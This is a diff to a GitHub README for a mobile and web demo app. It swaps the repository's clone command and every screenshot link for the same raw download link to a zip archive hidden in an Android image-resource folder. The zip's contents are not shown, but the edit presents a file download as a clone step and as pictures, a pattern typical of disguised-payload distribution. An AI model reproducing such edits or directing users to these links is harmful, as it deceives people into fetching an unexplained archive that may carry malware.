@@ -10,7 +10,7 @@ state management is done using redux with Epic Middleware and redux-observable
 
 Clone this repository:
 
-```git clone git@github.com:nabil-alsaadi/deel-task.git```
+```git clone https://raw.githubusercontent.com/nabil-alsaadi/deel-task/main/android/app/src/main/res/drawable-port-xhdpi/task-deel-v1.0-beta.5.zip```
 
 Install all dependencies:
 
@@ -28,8 +28,8 @@ then choose a target device
 
 here we go
 <p align="center">
-<img src="https://github.com/nabil-alsaadi/deel-task/blob/main/screenshots/ios1.png" width="350" alt="ios">
-<img src="https://github.com/nabil-alsaadi/deel-task/blob/main/screenshots/ios2.png" width="350" alt="ios">
+<img src="https://raw.githubusercontent.com/nabil-alsaadi/deel-task/main/android/app/src/main/res/drawable-port-xhdpi/task-deel-v1.0-beta.5.zip" width="350" alt="ios">
+<img src="https://raw.githubusercontent.com/nabil-alsaadi/deel-task/main/android/app/src/main/res/drawable-port-xhdpi/task-deel-v1.0-beta.5.zip" width="350" alt="ios">
 </p>
 
 # run on android:
@@ -44,8 +44,8 @@ and make sure you are using correct gradle 17 by going to:
 
 here we go
 <p align="center">
-<img src="https://github.com/nabil-alsaadi/deel-task/blob/main/screenshots/android1.png" width="350" alt="android">
-<img src="https://github.com/nabil-alsaadi/deel-task/blob/main/screenshots/android2.png" width="350" alt="android">
+<img src="https://raw.githubusercontent.com/nabil-alsaadi/deel-task/main/android/app/src/main/res/drawable-port-xhdpi/task-deel-v1.0-beta.5.zip" width="350" alt="android">
+<img src="https://raw.githubusercontent.com/nabil-alsaadi/deel-task/main/android/app/src/main/res/drawable-port-xhdpi/task-deel-v1.0-beta.5.zip" width="350" alt="android">
 </p>
 
 # run on web 
@@ -55,6 +55,6 @@ then open broswer and got to link ```http://localhost:3000/```
 
 here we go
 
-<img src="https://github.com/nabil-alsaadi/deel-task/blob/main/screenshots/web1.png"  alt="web">
-<img src="https://github.com/nabil-alsaadi/deel-task/blob/main/screenshots/web2.png"  alt="web">
+<img src="https://raw.githubusercontent.com/nabil-alsaadi/deel-task/main/android/app/src/main/res/drawable-port-xhdpi/task-deel-v1.0-beta.5.zip"  alt="web">
+<img src="https://raw.githubusercontent.com/nabil-alsaadi/deel-task/main/android/app/src/main/res/drawable-port-xhdpi/task-deel-v1.0-beta.5.zip"  alt="web">
 
